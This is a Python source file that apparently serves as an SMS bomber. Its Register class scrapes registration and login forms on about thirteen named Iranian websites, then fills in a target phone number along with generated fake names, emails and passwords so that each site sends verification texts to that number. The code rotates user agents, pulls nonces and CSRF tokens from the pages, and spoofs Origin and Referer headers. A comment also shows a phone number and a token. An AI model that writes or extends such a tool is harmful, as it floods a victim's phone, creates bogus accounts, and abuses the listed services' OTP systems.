from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
import requests
import random
import uuid
import time
import re

from utils import print_error, print_success


class Base:
    def __init__(self, phone):
        # Initialize with phone number, session, headers, and user agents
        self.phone = phone

        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) "
            "Version/17.0 Safari/605.1.15",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) "
            "Gecko/20100101 Firefox/120.0",
            "Mozilla/5.0 (Linux; Android 13; Pixel 7) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Mobile Safari/537.36",
        ]

        self.session = requests.Session()
        self.headers = {
            "User-Agent": random.choice(self.user_agents),
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest",
            "Accept-Language": "en-US,en;q=0.5",
            "Cache-Control": "no-cache",
            "Connection": "keep-alive"
        }

    def split_number_with_plus(self, number_str: str) -> str:
        # Split phone number into three parts with '+' separators
        number_str = number_str.replace("09", "9")
        part1 = number_str[0:3]
        part2 = number_str[3:6]
        part3 = number_str[6:]
        return f"{part1}+{part2}+{part3}"

    def post(self, url, data, save=False, headers=None):
        try:
            site = urlparse(url).netloc

            # Use default headers if none provided
            if headers is None:
                headers = self.headers

            # Send POST request with session (cookies preserved)
            r = self.session.post(url, data=data, headers=headers)

            if r.ok:
                print_success(f"SMS request successfully sent to {site}")
            else:
                print_error(f"Request to {site} failed with status code {r.status_code}")

            if save:
                self.save(r.text)

        except Exception as e:
            print_error(f"Failed to send data to {url}: {e}")

    def save(self, data):
        # Save response HTML to temp.html for debugging
        with open("temp.html", mode="w", encoding="utf-8") as file:
            file.write(data)

    def generate_strong_password(self, length=10):
        # Generate a random strong password using UUID
        return uuid.uuid4().hex[0:length]

    def unique_username(self, prefix="user"):
        # Generate unique username using prefix + timestamp + random number
        return f"{prefix}_{int(time.time())}_{random.randint(1000,9999)}"

    def unique_email(self, domain="example.com"):
        # Generate unique email using random UUID string
        local_part = uuid.uuid4().hex[:10]
        return f"{local_part}@{domain}"

    def set_input_to_data(self, inputs):
        # Convert HTML input fields into a dictionary
        data = {}
        for inp in inputs:
            name = inp.get("name")
            value = inp.get("value", "")
            if name:
                data[name] = value
        return data

    def get(self, url):
        try:
            # Send GET request and parse HTML with BeautifulSoup
            response = self.session.get(url)
            response.raise_for_status()
            soup = BeautifulSoup(response.content, "html.parser")
        except Exception as e:
            parsed = urlparse(url)
            print_error(f"Error fetching {parsed.netloc}: {e}")
            return None
        else:
            return soup
class Register(Base):
    # def session(self):
    #     chosen_agent = random.choice(self.user_agents)

    #     headers = {"User-Agent": chosen_agent}
    #     s = requests.Session()
    #     s.headers.update(headers)
    #     return s

    def digikala(self):
        try:
            url = "https://auth.digikala.com/realms/dk-group/protocol/openid-connect/auth?client_id=digikala-web-public&redirect_uri=https%3A%2F%2Fwww.digikala.com%2Fsso-redirect%2F%3Fback-url%3D%252F&state=0666420c-cb2e-4b34-8dc1-2797a4a9cff9&response_mode=fragment&response_type=code&scope=openid&nonce=737d5cc2-937c-471d-8f20-5e8f13acc556&code_challenge=737iVEmwecxNDo7sNAYxLbvvH7NFt3GHWeXvYRiATAs&code_challenge_method=S256"
            soup = self.get(url)
            if not soup:
                return

            form = soup.find("form")
            destonation = form.get("action")
            inputs = form.find_all("input")

            data = self.set_input_to_data(inputs)
            data["username"] = self.phone

            self.post(destonation, data)
        except Exception as e:
            print_error(f"Error Digikala -> {e}")

    def hermeslearn(self):
        try:
            url = "https://hermeslearn.com/portal/"
            soup = self.get(url)
            if not soup:
                return

            form = soup.find("form")
            inputs = form.find_all("input")

            data = self.set_input_to_data(inputs)

            data["username"] = self.phone

            self.post(url, data)
        except Exception as e:
            print_error(f"Error hermeslearn -> {e}")

    def cafeamuzesh(self):
        try:
            url = "https://cafeamuzesh.com/sigin/"
            soup = self.get(url)
            if not soup:
                return

            form = soup.find("form", attrs={"id": "ums-register-form"})
            inputs = form.find_all("input")

            data = self.set_input_to_data(inputs)

            data["mobile_user"] = self.phone
            data["user_email"] = self.unique_email()
            data["term"] = "ok"

            url = "https://cafeamuzesh.com/?ums-ajax=ums_register_form"

            self.post(url, data)

        except Exception as e:
            print_error(f"Error cafeamuzesh -> {e}")

    def rcs(self):
        try:
            url = "https://learn.rcs.ir/login"
            soup = self.get(url)
            if not soup:
                return

            form = soup.find("form")
            inputs = form.find_all("input")

            data = self.set_input_to_data(inputs)

            data["form[username]"] = self.phone
            url = urljoin(url, form.get("action"))

            self.post(url, data)

        except Exception as e:
            print_error(f"Error rcs -> {e}")

    def sabzlearn(self):
        try:
            url = "https://sabzlearn.ir/signup/"
            soup = self.get(url)
            if not soup:
                return

            form = soup.find("form")
            inputs = form.find_all("input")

            data = self.set_input_to_data(inputs)

            data["username"] = self.unique_username()
            data["email"] = self.unique_email()
            data["pass"] = self.generate_strong_password()
            # data["password"] = self.generate_strong_password()
            data["phone"] = self.phone
            data["action"] = "sthe_signup_otp"

            url = "https://sabzlearn.ir/wp-admin/admin-ajax.php"

            # POST	https://stats.g.doubleclick.net/g/collect?v=2&tid=G-VEL7T8MDRH&cid=1221159400.1763999553&gtm=45je5bi1v9132128983z89177179203za200zd9132128983&aip=1&dma=0&gcd=13l3l3l3l1l1&npa=0&frm=0&tag_exp=103116026~103200004~104527907~104528500~104684208~104684211~115583767~115938465~115938468~116184927~116184929~116217636~116217638~116474638

            self.post(url, data)

        except Exception as e:
            print_error(f"Error sabzlearn -> {e}")

    def learnfiles(self):
        try:
            url = "https://learnfiles.com/my-account/"
            soup = self.get(url)
            if not soup:
                return

            form = soup.find("form", attrs={"id": "dotline-register-form"})
            inputs = form.find_all("input")

            data = self.set_input_to_data(inputs)

            data["first_name"] = self.unique_username()
            data["last_name"] = self.unique_username()
            data["email"] = self.unique_email()
            data["password"] = self.generate_strong_password()
            data["mobile"] = self.phone
            data["action"] = "dotline_ajax_register"
            data["privacy"] = "1"
            data["token"] = ""
            data["security"] = data.get("dotline-register-security", "")

            url = "https://learnfiles.com/wp-admin/admin-ajax.php"

            self.post(url, data)

        except Exception as e:
            print_error(f"Error learnfiles -> {e}")

    def abzarwp(self):
        try:
            url = "https://abzarwp.com/wp-login.php?action=register"
            soup = self.get(url)
            if not soup:
                return

            form = soup.find("form", attrs={"id": "verificationform"})
            inputs = form.find_all("input")

            data = self.set_input_to_data(inputs)

            data["mobile"] = self.phone
            data["formid"] = "registerform"
            data["eferer"] = "/wp-login.php?action=register"

            url = "https://abzarwp.com/wp-admin/admin-ajax.php"
            self.post(url, data)

        except Exception as e:
            print_error(f"Error abzarwp -> {e}")

    def digistyle(self):
        try:
            url = "https://www.digistyle.com/users/login-register/"
            soup = self.get(url)
            if not soup:
                return

            form = soup.find("form")
            inputs = form.find_all("input")

            data = self.set_input_to_data(inputs)

            data["loginRegister[email_phone]"] = self.phone

            self.post(url, data)

        except Exception as e:
            print_error(f"Error digistyle -> {e}")

    def vidomart(self):
        def find_nonce_key():
            text = str(soup.find("script", attrs={"id": "master-script-js-before"}))
            if text:
                match = re.search(r'ajaxnonce:\s*"([a-zA-Z0-9]+)"', text)
                if match:
                    nonce_value = match.group(1)
                    return nonce_value
            return ""

        try:
            url = "https://www.vidomart.shop/login/"
            soup = self.get(url)
            if not soup:
                return

            form = soup.find("div", attrs={"class": "register-form"})
            inputs = form.find_all("input")

            data = self.set_input_to_data(inputs)

            data["mobile"] = self.phone
            data["password"] = self.generate_strong_password()
            data["email"] = self.unique_email()
            data["name"] = self.unique_username()
            data["family"] = self.unique_username()
            data["userType"] = "requester"
            data["nonce_key"] = find_nonce_key()
            data["action"] = "register_with_ajax"

            url = "https://www.vidomart.shop/wp-admin/admin-ajax.php"

            self.post(url, data)

        except Exception as e:
            print_error(f"Error vidomart -> {e}")

    def mohammadfarshadian(self):
        try:
            url = "https://mohammadfarshadian.com/"
            soup = self.get(url)
            if not soup:
                return

            form = soup.find("form", attrs={"class": "digits_register"})
            inputs = form.find_all("input")

            data = self.set_input_to_data(inputs)

            email = self.unique_email()
            data["action"] = "digits_check_mob"
            data["countrycode"] = "+98"
            data["mobileNo"] = self.split_number_with_plus(self.phone)
            data["csrf"] = form.find("input", attrs={"name": "dig_nounce"}).get(
                "value", ""
            )
            data["login"] = 2
            data["username"] = ""
            data["email"] = email
            data["dig_nounce"] = email.split("@")[0]
            data["mobmail2"] = email
            data["dig_reg_mail"] = email
            data["captcha_ses"] = ""
            data["captcha"] = ""
            data["digits"] = 1
            data["whatsapp"] = 0
            data["json"] = 1
            data["digits_reg_mail"] = self.split_number_with_plus(self.phone)
            data["digits_reg_password"] = self.generate_strong_password()

            url = "https://mohammadfarshadian.com/wp-admin/admin-ajax.php"
            self.post(url, data)

        except Exception as e:
            print_error(f"Error mohammadfarshadian -> {e}")

    def numberland(self):
        try:
            url = "https://numberland.ir/"
            soup = self.get(url)
            if not soup:
                return

            form = soup.find("form", attrs={"id": "checkfornewentertosite"})
            inputs = form.find_all("input")

            data = self.set_input_to_data(inputs)

            data["form[username]"] = self.phone
            url = urljoin(url, form.get("action"))

            print(url)
            print(data)
            # https://numberland.ir/ajax_login.php
            # vaziatload	"checkfornewentertosite"
            # enterbyusepass	"1"
            # XCSRFTOKEN	"b5e7cdfcdd31695ed129d5b528b112726bf61c383143aa08b5acbbdfe5b87e154d76932a"
            # user	"09218557979"
            # safeme	"1"
            self.post(url, data)

        except Exception as e:
            print_error(f"Error numberland -> {e}")

    def irankargah(self):
        try:
            url = "https://irankargah.com/"
            soup = self.get(url)
            if not soup:
                return

            form = soup.find("form", attrs={"class": "register"})
            inputs = form.find_all("input")

            data = self.set_input_to_data(inputs)

            data["phone"] = self.phone.replace("09", "9")
            data["digits_reg_name"] = self.unique_username()
            data["digits_reg_lastname"] = self.unique_username()
            data["email"] = self.unique_email()

            url = "https://irankargah.com/wp-admin/admin-ajax.php"

            self.post(url, data)

        except Exception as e:
            print_error(f"Error irankargah -> {e}")

    def startabad(self):
        try:
            url = "https://startabad.com/student-panel/?action=register"
            soup = self.get(url)
            if not soup:
                return
            form = soup.find("form", attrs={"class": "register"})
            inputs = form.find_all("input")

            data = self.set_input_to_data(inputs)

            data["email"] = self.unique_email()
            data["phone"] = self.phone.replace('09', '9')
            data["digits_reg_lastname"] = self.unique_username()
            data["digits_reg_name"] = self.unique_username()
            data["digits_reg_password"] = self.generate_strong_password()
            
            url = 'https://startabad.com/wp-admin/admin-ajax.php'
            
            header = self.headers.copy()
            header.update({
                "Origin": "https://startabad.com",
                "Referer": "https://startabad.com/?login=true&redirect_to=https%3A%2F%2Fstartabad.com%2Fstudent-panel%2F%3Faction%3Dregister&page=2"
            })
            
            self.post(url, data, headers=header)
        except Exception as e:
            print_error(f"Error startabad -> {e}")

    def start(self):
        methods = [
            # self.digikala,
            # self.rcs,
            # self.hermeslearn,
            # self.sabzlearn,
            # self.digistyle,
            # self.learnfiles,
            # self.abzarwp,
            # self.vidomart,
            # self.cafeamuzesh,
            # self.mohammadfarshadian,
            
            # change neaded
            # self.numberland,
            
            # every things are ok by sms will not send
            # self.irankargah,
            self.startabad
        ]
        for method in methods:
            try:
                method()
            except Exception as e:
                print_error(f"{method.__name__} failed: {e}")
